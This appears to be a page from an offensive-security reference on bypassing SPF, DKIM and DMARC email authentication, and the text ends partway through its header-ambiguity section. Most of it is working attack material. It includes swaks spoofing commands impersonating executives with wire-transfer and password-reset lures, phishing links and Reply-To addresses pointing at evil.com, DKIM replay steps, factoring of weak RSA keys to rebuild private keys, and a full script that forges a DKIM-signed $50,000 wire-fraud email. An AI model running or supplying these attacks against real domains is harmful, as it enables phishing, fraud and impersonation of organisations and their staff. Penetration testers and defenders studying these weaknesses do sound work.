---
title: SPF - DKIM - DMARC Bypass
description: SPF, DKIM, and DMARC email authentication mechanisms through SMTP manipulation, header injection, and spoofing techniques.
navigation:
  icon: i-lucide-shield-off
  title: Email Header Injection Attack
---

## Overview

::badge
**Email Authentication Bypass — Offensive Techniques**
::

Email authentication relies on three primary mechanisms: **SPF** (Sender Policy Framework), **DKIM** (DomainKeys Identified Mail), and **DMARC** (Domain-based Message Authentication, Reporting & Conformance). Each mechanism has exploitable weaknesses when misconfigured or improperly enforced.

::card-group
  ::card
  ---
  title: SPF Bypass
  icon: i-lucide-scan-search
  ---
  Exploiting authorized sender lists, include chains, and DNS lookup limits to send spoofed mail that passes SPF validation.
  ::

  ::card
  ---
  title: DKIM Bypass
  icon: i-lucide-key-round
  ---
  Abusing weak signing keys, missing header coverage, replay attacks, and signature manipulation to forge authenticated messages.
  ::

  ::card
  ---
  title: DMARC Bypass
  icon: i-lucide-shield-alert
  ---
  Circumventing alignment checks, exploiting `p=none` policies, subdomain delegation flaws, and header ambiguity to deliver spoofed mail.
  ::

  ::card
  ---
  title: SMTP Smuggling
  icon: i-lucide-mail-warning
  ---
  Leveraging SMTP protocol parsing differences between servers to inject spoofed messages that bypass all three authentication layers.
  ::
::

::tip
Before attempting any bypass, always perform full reconnaissance of the target domain's DNS records. Understanding the exact policy configuration determines which attack vector is viable.
::

---

## Reconnaissance & Enumeration

### DNS Record Extraction

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="dig"}
  ```bash
  # Extract SPF record
  dig +short TXT target.com | grep "v=spf1"

  # Extract DKIM record (common selectors)
  dig +short TXT default._domainkey.target.com
  dig +short TXT google._domainkey.target.com
  dig +short TXT selector1._domainkey.target.com
  dig +short TXT selector2._domainkey.target.com
  dig +short TXT s1._domainkey.target.com
  dig +short TXT s2._domainkey.target.com
  dig +short TXT mail._domainkey.target.com
  dig +short TXT k1._domainkey.target.com
  dig +short TXT dkim._domainkey.target.com
  dig +short TXT mandrill._domainkey.target.com
  dig +short TXT everlytickey1._domainkey.target.com
  dig +short TXT mxvault._domainkey.target.com

  # Extract DMARC record
  dig +short TXT _dmarc.target.com

  # Check MX records
  dig +short MX target.com

  # Check for wildcard DNS
  dig +short TXT *._domainkey.target.com

  # Full DNS enumeration
  dig ANY target.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="nslookup"}
  ```bash
  # SPF lookup
  nslookup -type=txt target.com

  # DKIM lookup
  nslookup -type=txt default._domainkey.target.com
  nslookup -type=txt google._domainkey.target.com
  nslookup -type=txt selector1._domainkey.target.com

  # DMARC lookup
  nslookup -type=txt _dmarc.target.com

  # MX lookup
  nslookup -type=mx target.com

  # Reverse DNS on MX
  nslookup 203.0.113.25
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="host"}
  ```bash
  # Quick SPF check
  host -t txt target.com

  # Quick DKIM check
  host -t txt default._domainkey.target.com
  host -t txt selector1._domainkey.target.com

  # Quick DMARC check
  host -t txt _dmarc.target.com

  # MX records
  host -t mx target.com
  ```
  :::
::

### DKIM Selector Brute Force

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---
```bash
# Brute force DKIM selectors with wordlist
for selector in $(cat dkim-selectors.txt); do
  result=$(dig +short TXT ${selector}._domainkey.target.com 2>/dev/null)
  if [ -n "$result" ]; then
    echo "[+] Found DKIM selector: ${selector} -> ${result}"
  fi
done
```

#code
```bash
# Brute force DKIM selectors with wordlist
for selector in $(cat dkim-selectors.txt); do
  result=$(dig +short TXT ${selector}._domainkey.target.com 2>/dev/null)
  if [ -n "$result" ]; then
    echo "[+] Found DKIM selector: ${selector} -> ${result}"
  fi
done
```
::

::collapsible
**Common DKIM Selector Wordlist**

```text [dkim-selectors.txt]
default
google
selector1
selector2
s1
s2
k1
k2
mail
dkim
smtp
email
mta
mx
mandrill
everlytickey1
everlytickey2
mxvault
protonmail
protonmail2
protonmail3
cm
pm
ses
amazonses
hsbnp
zendesk1
zendesk2
turbo-smtp
sendgrid
mailchimp
postmark
sparkpost
mailgun
sendpulse
dkim1024
beta
gamma
alpha
mailjet
```
::

### Automated Recon Tools

::code-group
```bash [checkdmarc]
# Full domain authentication audit
pip install checkdmarc
checkdmarc target.com

# JSON output
checkdmarc target.com -f json

# Multiple domains
checkdmarc target.com target2.com target3.com

# Check with DNS timeout
checkdmarc target.com --timeout 10
```

```bash [dmarc-analyzer]
# Parse DMARC record
python3 -c "
import dns.resolver
answers = dns.resolver.resolve('_dmarc.target.com', 'TXT')
for rdata in answers:
    print(rdata.to_text())
"
```

```bash [spoofcheck]
# Check if domain is spoofable
git clone https://github.com/BishopFox/spoofcheck.git
cd spoofcheck
pip install -r requirements.txt
python3 spoofcheck.py target.com
```

```bash [emailharvester]
# Enumerate email addresses for targeting
theHarvester -d target.com -b all -l 500
theHarvester -d target.com -b google,bing,linkedin -l 200
```
::

---

## SPF Analysis & Bypass

### SPF Record Parsing

::accordion
  :::accordion-item{icon="i-lucide-search" label="Understanding SPF Mechanisms"}
  | Mechanism | Description | Abuse Potential |
  |-----------|-------------|-----------------|
  | `ip4:` | Authorized IPv4 | Spoof from authorized IP |
  | `ip6:` | Authorized IPv6 | Spoof from authorized IPv6 |
  | `a:` | Domain A record | Compromise authorized host |
  | `mx:` | MX record hosts | Compromise mail server |
  | `include:` | External SPF | Abuse included third-party |
  | `redirect=` | SPF delegation | Follow redirect chain |
  | `exists:` | Macro-based check | Macro injection |
  | `ptr:` | Reverse DNS (deprecated) | PTR record manipulation |
  | `+all` | Allow everything | **Direct spoofing** |
  | `~all` | Softfail | **Spoofing with softfail** |
  | `?all` | Neutral | **Spoofing with neutral** |
  | `-all` | Hardfail | Requires bypass technique |
  :::

  :::accordion-item{icon="i-lucide-git-branch" label="SPF Include Chain Analysis"}
  ```bash
  # Recursive SPF include resolution
  python3 -c "
  import dns.resolver
  import re

  def resolve_spf(domain, depth=0):
      if depth > 10:
          print(f'  {'  '*depth}[!] Max depth reached - possible DNS lookup limit abuse')
          return
      try:
          answers = dns.resolver.resolve(domain, 'TXT')
          for rdata in answers:
              txt = rdata.to_text().strip('\"')
              if txt.startswith('v=spf1'):
                  print(f'  {'  '*depth}[SPF] {domain}: {txt}')
                  includes = re.findall(r'include:(\S+)', txt)
                  for inc in includes:
                      resolve_spf(inc, depth+1)
                  redirects = re.findall(r'redirect=(\S+)', txt)
                  for red in redirects:
                      resolve_spf(red, depth+1)
      except Exception as e:
          print(f'  {'  '*depth}[ERR] {domain}: {e}')

  resolve_spf('target.com')
  "
  ```
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="SPF DNS Lookup Limit (10-Lookup Attack)"}
  SPF is limited to **10 DNS lookups**. If an SPF record exceeds this, validation returns `permerror` and SPF effectively **fails open** on many mail servers.

  ```bash
  # Count DNS lookups in SPF chain
  python3 -c "
  import dns.resolver
  import re

  lookup_count = 0

  def count_lookups(domain, depth=0):
      global lookup_count
      if depth > 15:
          return
      try:
          answers = dns.resolver.resolve(domain, 'TXT')
          for rdata in answers:
              txt = rdata.to_text().strip('\"')
              if 'v=spf1' in txt:
                  includes = re.findall(r'include:(\S+)', txt)
                  a_records = re.findall(r'\ba[:/]', txt)
                  mx_records = re.findall(r'\bmx[:/\s]', txt)
                  exists = re.findall(r'exists:(\S+)', txt)
                  redirects = re.findall(r'redirect=(\S+)', txt)
                  ptr_records = re.findall(r'\bptr[:/\s]', txt)
                  
                  lookup_count += len(includes) + len(a_records) + len(mx_records) + len(exists) + len(redirects) + len(ptr_records)
                  
                  for inc in includes:
                      count_lookups(inc, depth+1)
                  for red in redirects:
                      count_lookups(red, depth+1)
      except:
          pass

  count_lookups('target.com')
  print(f'Total DNS lookups: {lookup_count}')
  if lookup_count >= 10:
      print('[+] VULNERABLE: SPF exceeds 10 DNS lookup limit!')
      print('[+] SPF will return permerror - spoofing may succeed')
  else:
      print(f'[-] SPF uses {lookup_count}/10 lookups')
  "
  ```
  :::
::

### SPF Bypass Techniques

::warning
SPF only validates the `MAIL FROM` (envelope sender) — not the `From:` header displayed to the user. This fundamental design flaw enables multiple bypass techniques.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Technique 1: +all / ~all / ?all"}
  ```bash
  # Target has +all (allow all) — direct spoof
  # v=spf1 +all
  swaks --to victim@target.com \
        --from ceo@target.com \
        --server target-mx.target.com \
        --header "Subject: Urgent Request" \
        --body "Please process the attached wire transfer."

  # Target has ~all (softfail) — most servers accept
  # v=spf1 include:_spf.google.com ~all
  swaks --to victim@target.com \
        --from ceo@target.com \
        --server target-mx.target.com \
        --header "Subject: Urgent - Action Required" \
        --body "Click here to reset your password."

  # Target has ?all (neutral) — always accepted
  # v=spf1 include:spf.protection.outlook.com ?all
  swaks --to victim@target.com \
        --from ceo@target.com \
        --server target-mx.target.com \
        --header "Subject: Q4 Report" \
        --body "Confidential document attached."
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Technique 2: Null Envelope Sender"}
  ```bash
  # Use empty MAIL FROM (bounces/DSN bypass SPF)
  swaks --to victim@target.com \
        --from "" \
        --header "From: ceo@target.com" \
        --header "Subject: Important Update" \
        --server target-mx.target.com \
        --body "Please review immediately."

  # Use <> as envelope sender
  swaks --to victim@target.com \
        --mail-from "<>" \
        --header "From: admin@target.com" \
        --header "Subject: System Notification" \
        --server target-mx.target.com

  # HELO/EHLO manipulation with null sender
  swaks --to victim@target.com \
        --mail-from "<>" \
        --ehlo target.com \
        --header "From: security@target.com" \
        --server target-mx.target.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Technique 3: Subdomain Abuse"}
  ```bash
  # Check if subdomains have SPF
  dig +short TXT sub.target.com
  dig +short TXT mail.target.com
  dig +short TXT dev.target.com
  dig +short TXT staging.target.com
  dig +short TXT test.target.com
  dig +short TXT internal.target.com

  # No SPF on subdomain = default pass
  swaks --to victim@company.com \
        --from noreply@dev.target.com \
        --header "From: noreply@dev.target.com" \
        --server company-mx.company.com \
        --header "Subject: Development Portal Access" \
        --body "Your dev credentials have been updated."

  # Spoof non-existent subdomain
  swaks --to victim@company.com \
        --from admin@notifications.target.com \
        --header "From: admin@notifications.target.com" \
        --server company-mx.company.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Technique 4: Include Chain Abuse"}
  ```bash
  # If target SPF includes a permissive third-party
  # v=spf1 include:_spf.google.com include:mailgun.org ~all
  
  # Send via Google SMTP (with Google Workspace trial)
  swaks --to victim@company.com \
        --from ceo@target.com \
        --server smtp.gmail.com:587 \
        --tls \
        --auth-user attacker@gmail.com \
        --auth-password "app-password" \
        --header "From: ceo@target.com"

  # Send via Mailgun (with free account)
  curl -s --user 'api:YOUR-MAILGUN-API-KEY' \
    https://api.mailgun.net/v3/YOUR-DOMAIN/messages \
    -F from='CEO <ceo@target.com>' \
    -F to='victim@company.com' \
    -F subject='Urgent Wire Transfer' \
    -F text='Please process immediately.'

  # Send via SendGrid (with free account)
  curl -X POST https://api.sendgrid.com/v3/mail/send \
    -H "Authorization: Bearer YOUR-API-KEY" \
    -H "Content-Type: application/json" \
    -d '{
      "personalizations":[{"to":[{"email":"victim@company.com"}]}],
      "from":{"email":"ceo@target.com"},
      "subject":"Q4 Budget",
      "content":[{"type":"text/plain","value":"See attached."}]
    }'
  ```
  :::
::

### SPF Bypass via Shared Infrastructure

::caution
Many organizations use shared email infrastructure (Google Workspace, Microsoft 365, Amazon SES). Any tenant on the same infrastructure can potentially send as another tenant's domain if SPF relies solely on `include:` records.
::

::code-collapse
```python [spf_shared_infra_check.py]
#!/usr/bin/env python3
"""Check if target domain shares SPF infrastructure with common providers"""

import dns.resolver
import re
import sys

SHARED_PROVIDERS = {
    '_spf.google.com': 'Google Workspace — Any Google Workspace account can pass SPF',
    'spf.protection.outlook.com': 'Microsoft 365 — Any M365 tenant can pass SPF',
    'amazonses.com': 'Amazon SES — Any SES account in same region can pass SPF',
    'sendgrid.net': 'SendGrid — Any SendGrid account can pass SPF',
    'mailgun.org': 'Mailgun — Any Mailgun account can pass SPF',
    'spf.mandrillapp.com': 'Mandrill/Mailchimp — Any Mandrill account can pass SPF',
    'mail.zendesk.com': 'Zendesk — Any Zendesk account can pass SPF',
    'sparkpostmail.com': 'SparkPost — Any SparkPost account can pass SPF',
    'freshdesk.com': 'Freshdesk — Any Freshdesk account can pass SPF',
    'helpscoutemail.com': 'HelpScout — Any HelpScout account can pass SPF',
    'mcsv.net': 'Mailchimp — Any Mailchimp account can pass SPF',
    'salesforce.com': 'Salesforce — Any Salesforce org can pass SPF',
    'hubspot.com': 'HubSpot — Any HubSpot account can pass SPF',
}

def get_spf(domain):
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for rdata in answers:
            txt = rdata.to_text().strip('"')
            if txt.startswith('v=spf1'):
                return txt
    except:
        pass
    return None

def check_shared(domain):
    spf = get_spf(domain)
    if not spf:
        print(f"[!] No SPF record found for {domain}")
        return
    
    print(f"[*] SPF Record: {spf}\n")
    
    includes = re.findall(r'include:(\S+)', spf)
    vulnerable = False
    
    for inc in includes:
        for provider, desc in SHARED_PROVIDERS.items():
            if provider in inc:
                print(f"[+] SHARED INFRA: {inc}")
                print(f"    └── {desc}")
                vulnerable = True
    
    if spf.endswith('~all') or spf.endswith('?all'):
        print(f"\n[+] SOFTFAIL/NEUTRAL: Policy ends with {'~all' if '~all' in spf else '?all'}")
        vulnerable = True
    
    if spf.endswith('+all'):
        print(f"\n[+] OPEN RELAY: Policy ends with +all — FULLY SPOOFABLE")
        vulnerable = True
    
    if not vulnerable:
        print("[-] No obvious shared infrastructure vulnerabilities found")

if __name__ == '__main__':
    domain = sys.argv[1] if len(sys.argv) > 1 else 'target.com'
    check_shared(domain)
```
::

---

## DKIM Analysis & Bypass

### DKIM Key Analysis

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Key Extraction"}
  ```bash
  # Extract DKIM public key
  dig +short TXT selector1._domainkey.target.com

  # Parse DKIM key details
  python3 -c "
  import dns.resolver
  import base64
  import re

  selectors = ['default','google','selector1','selector2','s1','s2','k1','mail','dkim']
  domain = 'target.com'

  for sel in selectors:
      try:
          answers = dns.resolver.resolve(f'{sel}._domainkey.{domain}', 'TXT')
          for rdata in answers:
              txt = rdata.to_text().strip('\"')
              print(f'[+] Selector: {sel}')
              print(f'    Record: {txt}')
              
              # Check key size
              p_match = re.search(r'p=([A-Za-z0-9+/=]+)', txt)
              if p_match:
                  key_data = base64.b64decode(p_match.group(1))
                  key_bits = len(key_data) * 8
                  print(f'    Key size: ~{key_bits} bits')
                  if key_bits <= 1024:
                      print(f'    [!] WEAK KEY — potentially factorable!')
              
              # Check testing mode
              if 't=y' in txt:
                  print(f'    [!] TESTING MODE — DKIM failures ignored!')
              
              print()
      except:
          pass
  "
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Key Weakness Check"}
  ```bash
  # Extract and test RSA key strength
  # Get the public key from DKIM record
  dig +short TXT selector1._domainkey.target.com | \
    grep -oP 'p=\K[A-Za-z0-9+/=]+' | \
    fold -w 64 | \
    (echo "-----BEGIN PUBLIC KEY-----"; cat; echo "-----END PUBLIC KEY-----") \
    > dkim_pubkey.pem

  # Analyze key with OpenSSL
  openssl rsa -pubin -in dkim_pubkey.pem -text -noout 2>/dev/null

  # Check key modulus size
  openssl rsa -pubin -in dkim_pubkey.pem -modulus -noout 2>/dev/null | \
    awk -F= '{print length($2)*4 " bits"}'

  # Factor weak RSA keys (768-bit or less)
  # Using msieve for small keys
  openssl rsa -pubin -in dkim_pubkey.pem -modulus -noout | \
    awk -F= '{print $2}' | \
    python3 -c "import sys; n=int(sys.stdin.read().strip(),16); print(f'Modulus: {n}\nBits: {n.bit_length()}')"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="DKIM Testing Mode Detection"}
  ```bash
  # Check for t=y (testing mode) across selectors
  for sel in default google selector1 selector2 s1 s2 k1 mail dkim; do
    result=$(dig +short TXT ${sel}._domainkey.target.com 2>/dev/null)
    if echo "$result" | grep -q "t=y"; then
      echo "[+] TESTING MODE on selector: ${sel}"
      echo "    DKIM signatures are NOT enforced!"
      echo "    Record: $result"
    fi
  done

  # Check for empty p= (revoked key)
  for sel in default google selector1 selector2 s1 s2 k1 mail dkim; do
    result=$(dig +short TXT ${sel}._domainkey.target.com 2>/dev/null)
    if echo "$result" | grep -qE "p=\s*[;\"]|p=$"; then
      echo "[+] REVOKED KEY on selector: ${sel}"
      echo "    This selector's signatures will always fail"
    fi
  done
  ```
  :::
::

### DKIM Bypass Techniques

::accordion
  :::accordion-item{icon="i-lucide-key-round" label="Technique 1: DKIM Replay Attack"}
  ```bash
  # Step 1: Receive a legitimate DKIM-signed email from target domain
  # Extract the full email with headers

  # Step 2: Extract DKIM-Signature header
  grep -A5 "DKIM-Signature:" legitimate_email.eml

  # Step 3: Modify non-signed headers only
  # Common headers NOT covered by DKIM h= field:
  # - To: (sometimes)
  # - Cc:
  # - Bcc:
  # - Reply-To: (sometimes)
  # - X-* headers

  # Step 4: Check which headers are signed
  grep "DKIM-Signature" legitimate_email.eml | grep -oP 'h=\K[^;]+'
  # Example output: from:to:subject:date:message-id
  # If 'to' is NOT in h= field, we can change recipient

  # Step 5: Replay with modified recipient
  # Change To: header to new victim
  sed 's/To: original@target.com/To: newvictim@target.com/' \
    legitimate_email.eml > replay_email.eml

  # Step 6: Send replayed email via SMTP
  swaks --to newvictim@target.com \
        --data replay_email.eml \
        --server target-mx.target.com

  # Alternative: Use sendmail
  cat replay_email.eml | sendmail -t

  # Alternative: Use Python
  python3 -c "
  import smtplib
  with open('replay_email.eml', 'r') as f:
      msg = f.read()
  server = smtplib.SMTP('target-mx.target.com', 25)
  server.sendmail('', 'newvictim@target.com', msg)
  server.quit()
  "
  ```
  :::

  :::accordion-item{icon="i-lucide-key-round" label="Technique 2: Missing DKIM / No Signature Required"}
  ```bash
  # If domain has no DKIM record or uses p= (empty key)
  # DKIM check returns "none" — no signature validation

  # Simply send without any DKIM signature
  swaks --to victim@company.com \
        --from admin@target.com \
        --header "From: admin@target.com" \
        --header "Subject: Password Reset Required" \
        --server company-mx.company.com \
        --body "Click here to reset: https://evil.com/reset"

  # Verify no DKIM enforcement with telnet
  telnet target-mx.target.com 25
  # EHLO attacker.com
  # MAIL FROM:<admin@target.com>
  # RCPT TO:<victim@target.com>
  # DATA
  # From: admin@target.com
  # To: victim@target.com
  # Subject: Test
  #
  # No DKIM signature attached
  # .
  # QUIT
  ```
  :::

  :::accordion-item{icon="i-lucide-key-round" label="Technique 3: l= Length Tag Exploitation"}
  ```bash
  # If DKIM signature includes l= (length) tag
  # Only the first l= bytes of body are signed
  # Attacker can APPEND content after the signed portion

  # Step 1: Check for l= tag in received email
  grep "DKIM-Signature" email.eml | grep "l="

  # Step 2: If l=500 is present, only first 500 bytes are signed
  # Extract signed body portion
  head -c 500 body.txt > signed_portion.txt

  # Step 3: Append malicious content after byte 500
  python3 -c "
  import email
  import email.policy

  with open('signed_email.eml', 'rb') as f:
      msg = email.message_from_binary_file(f, policy=email.policy.default)

  # Get the DKIM l= value
  dkim_sig = msg['DKIM-Signature']
  # Parse l= value
  import re
  l_match = re.search(r'l=(\d+)', dkim_sig)
  if l_match:
      l_val = int(l_match.group(1))
      print(f'[+] DKIM l= tag found: {l_val} bytes signed')
      print('[+] Content after this offset can be modified!')
      
      # Get current body
      body = msg.get_body(preferencelist=('plain',))
      content = body.get_content()
      
      # Append malicious content after signed portion
      malicious = '\n\n---\nIMPORTANT: Your password has expired.\nReset here: https://evil.com/reset\n'
      
      print(f'[+] Original body length: {len(content)}')
      print(f'[+] Appending {len(malicious)} bytes of malicious content')
  "
  ```
  :::

  :::accordion-item{icon="i-lucide-key-round" label="Technique 4: Weak RSA Key Factoring (≤1024-bit)"}
  ```bash
  # Extract modulus from DKIM public key
  dig +short TXT selector1._domainkey.target.com | \
    grep -oP 'p=\K[A-Za-z0-9+/=]+' > dkim_key_b64.txt

  # Convert to PEM format
  echo "-----BEGIN PUBLIC KEY-----" > dkim_pub.pem
  cat dkim_key_b64.txt | fold -w 64 >> dkim_pub.pem
  echo "-----END PUBLIC KEY-----" >> dkim_pub.pem

  # Check key size
  openssl rsa -pubin -in dkim_pub.pem -text -noout 2>/dev/null | head -1

  # For 512/768-bit keys, use CADO-NFS to factor
  # https://github.com/cado-nfs/cado-nfs
  git clone https://github.com/cado-nfs/cado-nfs.git
  cd cado-nfs
  make
  # Extract modulus as decimal
  openssl rsa -pubin -in ../dkim_pub.pem -modulus -noout | \
    awk -F= '{print $2}' | python3 -c "import sys; print(int(sys.stdin.read().strip(), 16))" \
    > modulus.txt
  # Factor it
  ./cado-nfs.py $(cat modulus.txt)

  # Once factored, reconstruct private key
  python3 -c "
  from Crypto.PublicKey import RSA
  # After factoring, you have p and q
  p = FACTOR_P  # Replace with factored prime
  q = FACTOR_Q  # Replace with factored prime
  n = p * q
  e = 65537
  from Crypto.Util.number import inverse
  phi = (p-1)*(q-1)
  d = inverse(e, phi)
  key = RSA.construct((n, e, d, p, q))
  with open('dkim_private.pem', 'wb') as f:
      f.write(key.export_key())
  print('[+] Private key reconstructed!')
  "
  ```
  :::
::

### Forging DKIM Signatures (With Compromised Key)

::code-collapse
```python [forge_dkim.py]
#!/usr/bin/env python3
"""Forge DKIM signature using compromised/factored private key"""

import dkim
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Configuration
SELECTOR = b"selector1"
DOMAIN = b"target.com"
PRIVATE_KEY_FILE = "dkim_private.pem"

# Build email
msg = MIMEMultipart()
msg['From'] = 'ceo@target.com'
msg['To'] = 'victim@company.com'
msg['Subject'] = 'Urgent: Wire Transfer Required'
msg['Date'] = 'Mon, 15 Jan 2025 10:30:00 -0500'
msg['Message-ID'] = '<unique-id-12345@target.com>'

body = MIMEText("""
Dear Finance Team,

Please process an urgent wire transfer of $50,000 to the following account:

Bank: International Bank
Account: 1234567890
Routing: 987654321

This must be completed by end of day.

Best regards,
CEO
""")
msg.attach(body)

# Read private key
with open(PRIVATE_KEY_FILE, 'rb') as f:
    private_key = f.read()

# Sign with DKIM
raw_message = msg.as_bytes()
signature = dkim.sign(
    raw_message,
    SELECTOR,
    DOMAIN,
    private_key,
    include_headers=[
        b'From', b'To', b'Subject', b'Date', b'Message-ID'
    ]
)

# Prepend DKIM signature to message
signed_message = signature + raw_message

# Send
smtp = smtplib.SMTP('target-mx.company.com', 25)
smtp.sendmail('ceo@target.com', 'victim@company.com', signed_message)
smtp.quit()
print("[+] DKIM-signed spoofed email sent!")
```
::

---

## DMARC Analysis & Bypass

### DMARC Policy Analysis

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---
```bash
# Full DMARC record analysis
dig +short TXT _dmarc.target.com
```

#code
```bash
# Example outputs and their implications:
# "v=DMARC1; p=none;"                    → NO ENFORCEMENT - freely spoofable
# "v=DMARC1; p=none; rua=mailto:..."     → Monitoring only - freely spoofable
# "v=DMARC1; p=quarantine; pct=0;"       → Policy at 0% - NOT enforced
# "v=DMARC1; p=quarantine; pct=50;"      → 50% enforcement - 50% chance
# "v=DMARC1; p=reject; sp=none;"         → Subdomain policy is none!
# "v=DMARC1; p=reject;"                  → Full enforcement (bypass needed)
```
::

::note
The `pct=` tag specifies what percentage of messages are subject to DMARC policy. `pct=0` means the policy is effectively **not enforced** on any message, regardless of the `p=` value.
::

### DMARC Tag Reference

::collapsible
**DMARC Record Tags and Offensive Implications**

| Tag | Values | Offensive Implication |
|-----|--------|----------------------|
| `p=none` | none | **No enforcement** — spoofing works |
| `p=quarantine` | quarantine | Mail goes to spam — may still be read |
| `p=reject` | reject | Mail rejected — bypass required |
| `sp=` | none/quarantine/reject | **Subdomain policy** — often weaker than `p=` |
| `pct=` | 0-100 | **Percentage enforced** — `pct=0` = no enforcement |
| `aspf=` | r (relaxed) / s (strict) | **SPF alignment** — `r` allows subdomain abuse |
| `adkim=` | r (relaxed) / s (strict) | **DKIM alignment** — `r` allows subdomain abuse |
| `rua=` | mailto: | Aggregate report destination — recon value |
| `ruf=` | mailto: | Forensic report destination — recon value |
| `fo=` | 0/1/d/s | Failure reporting options |
::

### DMARC Bypass Techniques

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Technique 1: p=none Exploitation"}
  ```bash
  # DMARC p=none means NO action on failures
  # Even with SPF/DKIM fail, mail is delivered

  # Direct spoofing
  swaks --to victim@company.com \
        --from ceo@target.com \
        --header "From: CEO <ceo@target.com>" \
        --header "Reply-To: attacker@evil.com" \
        --header "Subject: Confidential - Board Meeting" \
        --server company-mx.company.com \
        --body "Please review the attached board presentation."

  # With HTML body for phishing
  swaks --to victim@company.com \
        --from it-support@target.com \
        --header "From: IT Support <it-support@target.com>" \
        --header "Subject: Password Expiry Notice" \
        --server company-mx.company.com \
        --attach-type text/html \
        --attach-body '<html><body>
        <p>Your password expires in 24 hours.</p>
        <p><a href="https://evil.com/reset">Click here to reset</a></p>
        <p>IT Support Team</p>
        </body></html>'
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Technique 2: Subdomain sp=none"}
  ```bash
  # When p=reject but sp=none (or sp= not set)
  # Subdomains inherit NO policy or weaker policy

  # Check subdomain policy
  dig +short TXT _dmarc.target.com
  # v=DMARC1; p=reject; sp=none;
  # OR
  # v=DMARC1; p=reject;
  # (sp defaults to p= value in RFC, but some servers handle it differently)

  # Spoof from subdomain
  swaks --to victim@company.com \
        --from alert@mail.target.com \
        --header "From: Security Alert <alert@mail.target.com>" \
        --header "Subject: Unusual Login Activity" \
        --server company-mx.company.com \
        --body "We detected a login from an unknown device."

  # Try non-existent subdomains
  swaks --to victim@company.com \
        --from noreply@notifications.target.com \
        --header "From: noreply@notifications.target.com" \
        --server company-mx.company.com

  swaks --to victim@company.com \
        --from admin@portal.target.com \
        --header "From: admin@portal.target.com" \
        --server company-mx.company.com

  # Enumerate subdomains for DMARC gaps
  for sub in mail dev staging test beta internal portal app api cdn; do
    result=$(dig +short TXT _dmarc.${sub}.target.com 2>/dev/null)
    if [ -z "$result" ]; then
      echo "[+] No DMARC on ${sub}.target.com — potentially spoofable"
    else
      echo "[-] DMARC found on ${sub}.target.com: $result"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Technique 3: pct=0 Bypass"}
  ```bash
  # When pct=0, DMARC policy applies to 0% of messages
  # ALL messages bypass regardless of p= value
  
  # v=DMARC1; p=reject; pct=0;
  # This is effectively the same as p=none

  swaks --to victim@company.com \
        --from ceo@target.com \
        --header "From: CEO <ceo@target.com>" \
        --header "Subject: Urgent Action Required" \
        --server company-mx.company.com

  # Low pct values also exploitable
  # v=DMARC1; p=reject; pct=10;
  # 90% of spoofed messages will NOT have policy applied
  # Send multiple attempts
  for i in $(seq 1 20); do
    swaks --to victim@company.com \
          --from ceo@target.com \
          --header "From: CEO <ceo@target.com>" \
          --header "Subject: Follow Up $i" \
          --header "Message-ID: <msg-${i}-$(date +%s)@target.com>" \
          --server company-mx.company.com \
          --silent 2
    echo "Attempt $i sent"
    sleep 2
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Technique 4: Relaxed Alignment Abuse"}
  ```bash
  # DMARC relaxed alignment (aspf=r, adkim=r)
  # Only checks Organizational Domain match
  # any.subdomain.target.com aligns with target.com

  # v=DMARC1; p=reject; aspf=r; adkim=r;

  # Step 1: Register a sending service or use any subdomain
  # The MAIL FROM domain just needs to share the org domain

  # If you control ANY subdomain of target.com
  # or can send via a service that uses a target.com subdomain:
  swaks --to victim@company.com \
        --mail-from "bounce@anything.target.com" \
        --header "From: ceo@target.com" \
        --server company-mx.company.com

  # Relaxed DKIM alignment
  # Sign with key for sub.target.com, From: header says target.com
  # DMARC passes because org domains match
  ```
  :::
::

### DMARC Bypass via Header Ambiguity

::caution
Multiple `From:` headers or specially crafted headers can confuse mail servers that parse headers differently, leading to DMARC bypass where SPF/DKIM validate one domain while the user sees another.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Multiple From Headers"}
  ```bash
  # Some MUAs display the first From:, others the last
  # DMARC may check a different From: than what's displayed

  # Technique: Double From header
  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header "From: attacker@evil.com" \
        --header "From: ceo@target.com" \
        --server company-mx.company.com \
        --header "Subject: Important Update"

  # Technique: From with display name confusion
  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header 'From: "ceo@target.com" <attacker@evil.com>' \
        --server company-mx.company.com

  # Technique: Unicode/encoded display name
  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header 'From: =?utf-8?b?Y2VvQHRhcmdldC5jb20=?= <attacker@evil.com>' \
        --server company-mx.company.com

  # Technique: Null byte in From
  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header "From: ceo@target.com\x00@evil.com" \
        --server company-mx.company.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Sender Header Confusion"}
  ```bash
  # Use Sender: header to display different identity
  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header "From: attacker@evil.com" \
        --header "Sender: ceo@target.com" \
        --header "Subject: From the CEO" \
        --server company-mx.company.com

  # Reply-To manipulation
  swaks --to victim@company.com \
        --from noreply@target.com \
        --header "From: noreply@target.com" \
        --header "Reply-To: attacker@evil.com" \
        --header "Subject: Account Verification" \
        --server company-mx.company.com

  # Resent-From header injection
  swaks --to victim@company.com \
        --from attacker@evil.com \
        --header "Resent-From: ceo@target.com" \
        --header "Resent-To: victim@company.com" \
        --header "Resent-Date: Mon, 15 Jan 2025 10:00:00 -0500" \
        --server company-mx.company.com
  ```
  :::

